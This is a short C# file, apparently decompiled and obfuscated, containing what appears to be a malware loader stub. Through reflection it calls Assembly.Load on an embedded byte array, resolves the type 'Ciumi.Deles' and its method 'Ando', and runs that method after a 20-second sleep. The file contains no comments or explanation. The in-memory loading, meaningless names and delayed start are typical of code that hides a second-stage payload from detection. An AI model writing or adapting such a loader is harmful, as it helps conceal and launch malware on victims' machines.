using System;
using System.Reflection;
using System.Threading;

namespace S;

internal sealed class O
{
	internal delegate Assembly k(byte[] byte_0);

	internal delegate void n();

	internal static byte[] B = J.S;

	internal static Type v = ((k)Delegate.CreateDelegate(typeof(k), w()))(B).GetType("Ciumi.Deles");

	internal static n q = (n)Delegate.CreateDelegate(typeof(n), v, "Ando");

	private static MethodInfo w()
	{
		return J.b.GetMethod("Load", new Type[1] { typeof(byte[]) });
	}

	private static void t()
	{
		Thread.Sleep(20000);
		q();
	}
}
